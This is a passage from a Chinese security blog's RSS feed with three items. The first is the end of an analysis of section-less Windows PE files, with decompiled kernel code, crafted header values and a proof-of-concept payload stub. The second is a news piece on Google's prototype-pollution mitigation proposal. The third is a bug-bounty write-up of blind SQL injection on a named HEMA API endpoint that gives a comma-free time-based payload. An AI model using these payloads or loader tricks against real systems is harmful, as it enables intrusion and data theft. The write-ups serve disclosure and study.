&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xC000007B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;MiLogCreateImageFileMapFailure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v29&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DWORD1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ImageFailureReason&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_81&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当该标志置位时，MiBuildImageControlArea将整个文件视为单个节区：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SectionCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术验证&#34;&gt;技术验证
&lt;/h2&gt;&lt;h3 id=&#34;示例1无节区可执行pe&#34;&gt;示例1：无节区可执行PE
&lt;/h3&gt;&lt;p&gt;通过手工构造的PE头部演示该技术（关键字段）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOS&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;e_magic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x5A4D&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;e_lfanew&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;SectionAlignment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 关键值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nl&#34;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x100000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;NumberOfSections&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 无节区
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;nl&#34;&gt;Characteristics&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x22&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;附加的位置无关代码通过动态加载user32.dll调用MessageBoxA，该payload同时兼容32/64位环境：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;; 架构检测机制
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;push&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pop&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;ecx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;cmp&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;je&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;bit_code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;示例2带伪造节区的可执行pe&#34;&gt;示例2：带伪造节区的可执行PE
&lt;/h3&gt;&lt;p&gt;更有趣的是可以创建虚假的只读节区。虽然节区标记为只读，但实际内存仍具有RWX权限：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;伪造的节区头部&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;VirtualSize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nl&#34;&gt;Characteristics&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x40000040&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 只读标志
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;有效载荷可以嵌入NT头部内部（SizeOfHeaders值可设为0）&lt;/li&gt;
&lt;li&gt;从Vista到Win10所有版本均受影响&lt;/li&gt;
&lt;li&gt;现代反汇编工具已能识别此类文件&lt;/li&gt;
&lt;li&gt;可能最初设计用于超小镜像（整镜像小于内存页）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://example.com/samples.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;示例EXE文件下载&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别说明：该技术通过比较栈指针变化检测运行架构，虽非最优但足够用于概念验证。实际攻击中可采用更精细的检测方法。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>谷歌工程师提出方案缓解JavaScript原型污染漏洞</title>
        <link>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%8F%90%E5%87%BA%E6%96%B9%E6%A1%88%E7%BC%93%E8%A7%A3javascript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sat, 02 Aug 2025 12:20:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B0%B7%E6%AD%8C%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%8F%90%E5%87%BA%E6%96%B9%E6%A1%88%E7%BC%93%E8%A7%A3javascript%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;谷歌工程师提出方案缓解原型污染&#34;&gt;谷歌工程师提出方案缓解原型污染
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;John Leyden&lt;/strong&gt;&lt;br&gt;
2023年2月6日 15:57 UTC&lt;br&gt;
更新于2023年2月6日 17:02 UTC&lt;/p&gt;
&lt;p&gt;谷歌的软件工程师提出了一项提案，旨在遏制已成为Web安全公害的原型污染漏洞。原型污染是JavaScript语言缺陷，允许攻击者在运行时操纵他们无法控制或访问的对象。该问题源于对象（用于在运行时保存数据）与其原型（决定对象行为方式）之间缺乏明确界限。&lt;/p&gt;
&lt;p&gt;这项获得谷歌支持的提案已提交给技术工作组TC39审议，旨在创建JavaScript对象与原型之间的边界。其技术原理是&amp;quot;消除允许攻击者从对象跳转到原型的路径&amp;quot;。提案技术细节已发布在GitHub上。&lt;/p&gt;
&lt;h2 id=&#34;可选安全模式&#34;&gt;可选安全模式
&lt;/h2&gt;&lt;p&gt;正如GitHub帖子所述，该&amp;quot;提案试图通过引入可选安全模式来缓解原型污染，该模式使得无法使用字符串属性键访问原型，而要求必须通过方法（Object.getPrototypeOf）或提议的新符号属性键来访问&amp;quot;。&lt;/p&gt;
&lt;p&gt;提案合著者Santiago Diaz表示：&amp;ldquo;目标是打破已知的利用技术，同时尽可能与现有代码库兼容，以便这种缓解措施能在互联网上广泛采用。&amp;ldquo;TC39工作组已批准提案从阶段0进入阶段1，开始了五部分批准流程的下一阶段。&lt;/p&gt;
&lt;h2 id=&#34;符号解决方案&#34;&gt;符号解决方案
&lt;/h2&gt;&lt;p&gt;PortSwigger安全研究员Gareth Hayes对此提案表示兴趣：&amp;ldquo;这是通过让开发者能够移除__proto__等属性来防止原型污染的提案。他们建议使用符号使网站继续使用__proto__功能，这样网站不会崩溃，攻击者也无法提供这些符号，因为这需要JavaScript执行。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;谷歌提案并非首创。但根据谷歌博客文章，现有解决方案如Object.freeze、preventExtensions和seal存在&amp;quot;使其难以部署的缺点&amp;rdquo;。该提案有望提供更实用的解决方案。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HEMA网站盲注SQL注入漏洞技术分析</title>
        <link>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 12:04:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;hema网站盲sql注入漏洞分析&#34;&gt;HEMA网站盲SQL注入漏洞分析
&lt;/h1&gt;&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;现代网站普遍采用数据库存储数据，服务器应用通过SQL查询语句与数据库交互。当存在查询构造缺陷时，攻击者可能通过注入恶意SQL代码获取敏感数据，这类漏洞被称为SQL注入(SQLi)，在漏洞赏金计划中通常属于高危漏洞。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在HEMA照片项目服务子域fasteditor.hema.com发现可疑API端点：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://fasteditor.hema.com/api/user/&amp;lt;userID&amp;gt;/products?offset=0&amp;amp;limit=8&amp;amp;orderby=id+DESC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;测试发现orderby参数存在SQL注入特征：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;插入单引号导致返回PDO错误&lt;/li&gt;
&lt;li&gt;错误信息显示原始SQL片段且未转义&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞利用技术&#34;&gt;漏洞利用技术
&lt;/h2&gt;&lt;p&gt;SQLMap工具检测确认存在三种攻击方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;：通过结果排序差异推断数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;堆叠查询&lt;/strong&gt;：追加执行额外SQL语句&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间盲注&lt;/strong&gt;：利用SLEEP()函数时序分析&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;手工payload构造&#34;&gt;手工Payload构造
&lt;/h2&gt;&lt;p&gt;由于防火墙限制，最终采用时间盲注技术构造特殊payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orderby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;CASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FOR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;§h§&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;THEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ELSE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键技术点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用FROM/FOR替代被过滤的逗号&lt;/li&gt;
&lt;li&gt;通过Burp Intruder自动化字符爆破&lt;/li&gt;
&lt;li&gt;响应时间差异判断字符命中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞验证结果&#34;&gt;漏洞验证结果
&lt;/h2&gt;&lt;p&gt;成功获取数据库用户信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hema_live@10.0.102.192
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;证明该端点存在可被利用的SQL注入漏洞。&lt;/p&gt;
